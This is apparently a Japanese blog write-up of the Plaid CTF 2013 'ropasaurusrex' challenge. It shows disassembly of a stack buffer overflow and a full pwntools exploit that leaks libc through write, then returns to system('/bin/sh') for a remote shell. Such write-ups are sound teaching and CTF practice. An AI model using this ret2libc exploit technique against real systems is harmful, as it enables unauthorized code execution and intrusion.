---
layout: post
redirect_from:
  - /blog/2016/02/15/plaidctf-2013-ropasaurusrex/
date: 2016-02-15T23:20:14+09:00
tags: [ "ctf", "writeup", "pwn", "plaidctf", "return-oriented-programming", "buffer-overflow", "stack-overflow" ]
---

# Plaid CTF 2013 ropasaurusrex

binary読んだり脆弱性探したりする必要がなく単にropするだけなのでとても楽。

## [ropasaurusrex](http://shell-storm.org/repo/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/)

``` sh
$ file ropasaurusrex
ropasaurusrex: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.18, BuildID[sha1]=96997aacd6ee7889b99dc156d83c9d205eb58092, stripped

$ checksec --file ropasaurusrex
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ropasaurusrex
```

xinetd型。relro無し。canary無し。libcは与えられる。

``` sh
$ ll ropasaurusrex
-rwxr-xr-x 1 user user 2948 Apr 22  2013 ropasaurusrex
```

コードはとても短かくて、実質以下のふたつの関数のみからなる。

``` asm
080483f4 <bof>:
 80483f4:       55                      push   ebp
 80483f5:       89 e5                   mov    ebp,esp
 80483f7:       81 ec 98 00 00 00       sub    esp,0x98
 80483fd:       c7 44 24 08 00 01 00    mov    DWORD PTR [esp+0x8],0x100
 8048404:       00 
 8048405:       8d 85 78 ff ff ff       lea    eax,[ebp-0x88]
 804840b:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 804840f:       c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
 8048416:       e8 11 ff ff ff          call   804832c <read@plt>
 804841b:       c9                      leave  
 804841c:       c3                      ret    

0804841d <main>:
 804841d:       55                      push   ebp
 804841e:       89 e5                   mov    ebp,esp
 8048420:       83 e4 f0                and    esp,0xfffffff0
 8048423:       83 ec 10                sub    esp,0x10
 8048426:       e8 c9 ff ff ff          call   80483f4 <bof>
 804842b:       c7 44 24 08 04 00 00    mov    DWORD PTR [esp+0x8],0x4
 8048432:       00 
 8048433:       c7 44 24 04 10 85 04    mov    DWORD PTR [esp+0x4],0x8048510 # "WIN\n"
 804843a:       08 
 804843b:       c7 04 24 01 00 00 00    mov    DWORD PTR [esp],0x1
 8048442:       e8 c5 fe ff ff          call   804830c <write@plt>
 8048447:       c9                      leave  
 8048448:       c3                      ret    
```

### 攻撃

普通にropする。`read`のアドレスを`write`して脆弱性のある関数を呼び出し、得られた`read`のアドレスから`system`と`"/bin/sh"`を計算し、再度ropしこれを呼ぶ。

### 実装

`objdump -R ropasaurusrex | grep read`とかして出てきたアドレスをコピペして即値として使ってたらコピペミスが発生したので、ちゃんとpwnlibの[機能](http://pwntools.readthedocs.org/en/2.2/elf.html)を使いました。

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()

elf = ELF('./ropasaurusrex')
if args.host == 'localhost':
    libc = ELF('/usr/lib32/libc.so.6')
else:
    libc = ELF('./libc.so.6')

bof = 0x80483f4 # the vulnerable function
buffer_len = 0x88

context.log_level = 'debug'
p = remote(args.host, args.port)

payload = ''
payload += 'A' * buffer_len
payload += 'AAAA' # saved ebp
payload += p32(elf.symbols['write'])
payload += p32(bof)
payload += p32(1) # stdout
payload += p32(elf.got['read'])
payload += p32(4) # len
p.send(payload)
resp = p.recvn(4)
read = u32(resp)
libc_base = read - libc.symbols['read']

payload = ''
payload += 'A' * buffer_len
payload += 'AAAA' # saved ebp
payload += p32(libc_base + libc.symbols['system'])
payload += 'AAAA' # cont
payload += p32(libc_base + next(libc.search('/bin/sh')))
p.send(payload)

p.sendline('ls')
p.interactive()
```
